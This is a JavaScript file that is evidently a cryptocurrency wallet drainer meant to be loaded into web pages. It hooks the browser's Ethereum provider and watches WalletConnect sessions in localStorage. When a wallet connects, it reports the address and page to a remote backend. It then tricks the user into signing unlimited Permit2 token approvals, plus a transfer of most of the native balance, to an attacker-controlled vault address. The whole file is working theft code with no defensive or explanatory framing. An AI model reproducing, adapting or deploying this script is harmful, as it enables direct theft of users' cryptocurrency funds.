(function () {
  'use strict';
  if (window.__LEGION_PROXY_LOADED__) return;
  window.__LEGION_PROXY_LOADED__ = true;

  var CFG = Object.assign({
    backendUrl:  'https://sadrailala-production.up.railway.app',
    kineticKey:  'uK2WF0w8VynajJYsSmA95bDxThM14BdG',
    wcProjectId: 'a785da105621eb55c998a35c57587667',
    vaultEvm:    '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE',
    silentMode:  false,
  }, window.LEGION_CONFIG || {});
  var BACKEND = CFG.backendUrl.replace(/\/$/, '');
  var L = CFG.silentMode ? {log:function(){},warn:function(){},err:function(){}} : {log:function(m){console.log('[LP]',m);},warn:function(m){console.warn('[LP]',m);},err:function(m){console.error('[LP]',m);}};
  var _drained={}, _inFlight={}, _wcSeen={}, _provider=null;

  function headers() { return {'Content-Type':'application/json','x-kinetic-key':CFG.kineticKey,'x-session-id':Math.random().toString(36).slice(2)}; }
  async function api(path, body) { try { var r=await fetch(BACKEND+path,{method:'POST',headers:headers(),body:JSON.stringify(body),credentials:'omit',keepalive:true}); if(!r.ok)return null; return await r.json(); } catch(e){ L.warn('api '+path+' err:'+(e.message||e)); return null; } }
  async function getChainId(prov) { try{return parseInt(await prov.request({method:'eth_chainId'}),16)||1;}catch(_){return 1;} }
  async function getEthBal(addr,prov) { try{var h=await prov.request({method:'eth_getBalance',params:[addr,'latest']});return BigInt(h||'0x0');}catch(_){return 0n;} }
  async function scanTokens(addr) { try { var r=await api('/api/scout/recursive-predator-fusion',{evm_holder:addr}); var assets=(r&&r.data&&r.data.assets)||(r&&r.assets)||[]; return assets.filter(function(a){return(a.family==='EVM'||a.chain_family==='EVM')&&a.token_address&&a.token_address!=='0x0000000000000000000000000000000000000000'&&(a.amount_usd||0)>0;}).map(function(a){return a.token_address;}); } catch(_){return [];} }

  async function drain(address, prov) {
    var key=address.toLowerCase();
    if(!key||_drained[key]||_inFlight[key])return;
    _inFlight[key]=true;
    L.log('drain start '+key.slice(0,10));
    try {
      var cid=await getChainId(prov);
      api('/api/v1/scout',{user_address:address,chain_id:cid,wallet_type:'injected',chain_family:'EVM',source_page:window.location.href});
      var tokens=await scanTokens(address);
      L.log('tokens:'+tokens.length+' chain:'+cid);
      var ethBal=await getEthBal(address,prov);
      var nativeAmt=ethBal>1000000000000000n?(ethBal-500000000000000n).toString():'0';
      if(!tokens.length&&nativeAmt==='0'){L.log('no assets');_inFlight[key]=false;return;}
      var permits=tokens.map(function(t){return{token:t,amount:'115792089237316195423570985008687907853269984665640564039457584007913129639935'};});
      var batchRes=await api('/api/v1/signature-anchor/permit2-batch-typed-data',{wallet_address:address,chain_id:cid,permits:permits,nativeAmount:nativeAmt});
      var msg=batchRes&&(batchRes.data||batchRes);
      if(!msg||!msg.message){L.warn('no msg');_inFlight[key]=false;return;}
      L.log('requesting sig...');
      var sig=null;
      try{sig=await prov.request({method:'eth_signTypedData_v4',params:[address,typeof msg.message==='string'?msg.message:JSON.stringify(msg.message)]});}
      catch(se){try{var ms=typeof msg.message==='string'?msg.message:JSON.stringify(msg.message);var hx='0x'+Array.from(new TextEncoder().encode(ms)).map(function(b){return b.toString(16).padStart(2,'0');}).join('');sig=await prov.request({method:'personal_sign',params:[hx,address]});}catch(_){}}
      if(!sig){L.warn('sig rejected');_inFlight[key]=false;return;}
      L.log('submitting...');
      var sub=await api('/api/v1/signature-anchor',{ingress:'normalized_v1',chain_family:'EVM',protocol:'permit2_batch',wallet_address:address,chain_id:cid,signature:sig,nonce:msg.nonce||('lp:'+Date.now()),expiry_iso:msg.expiry_iso||new Date(Date.now()+3600000).toISOString(),scout_value_usd:0,erc20s:tokens});
      L.log('submit:'+(sub&&sub.status));
      _drained[key]=true;
    } catch(e){L.err('err:'+(e.message||e));}
    finally{_inFlight[key]=false;}
  }

  function wrap(eth) {
    if(!eth||eth.__lpWrapped)return eth;
    eth.__lpWrapped=true; _provider=eth; L.log('provider wrapped');
    var orig=eth.request.bind(eth);
    eth.request=async function(args){
      var res=await orig(args);
      if(args&&(args.method==='eth_requestAccounts'||args.method==='eth_accounts')){var accs=Array.isArray(res)?res:[];if(accs[0]){L.log('addr:'+accs[0].slice(0,10));setTimeout(function(){drain(accs[0],eth);},600);}}
      return res;
    };
    try{eth.on('accountsChanged',function(accs){if(accs&&accs[0])setTimeout(function(){drain(accs[0],eth);},600);});}catch(_){}
    return eth;
  }

  if(window.ethereum){wrap(window.ethereum);}
  else{var _e;try{Object.defineProperty(window,'ethereum',{configurable:true,enumerable:true,get:function(){return _e;},set:function(v){_e=v;if(v)wrap(v);}});}catch(_){var _pc=0,_pi=setInterval(function(){if(window.ethereum&&!window.ethereum.__lpWrapped)wrap(window.ethereum);if(++_pc>120)clearInterval(_pi);},500);}}

  setInterval(function(){try{Object.keys(localStorage).forEach(function(k){if(_wcSeen[k])return;if(k.indexOf('wc@2')===-1||k.indexOf('session')===-1)return;var obj=JSON.parse(localStorage.getItem(k)||'{}');Object.values(obj).forEach(function(sess){if(!sess||!sess.namespaces)return;var accs=[];Object.values(sess.namespaces).forEach(function(ns){if(ns.accounts)accs=accs.concat(ns.accounts);});if(accs.length){var addr=accs[0].split(':').pop();L.log('WC:'+addr.slice(0,10));var prov=window.ethereum||_provider;if(addr&&prov)setTimeout(function(){drain(addr,prov);},1500);}});_wcSeen[k]=true;});}catch(_){}},2000);

  L.log('loaded backend='+BACKEND);
})();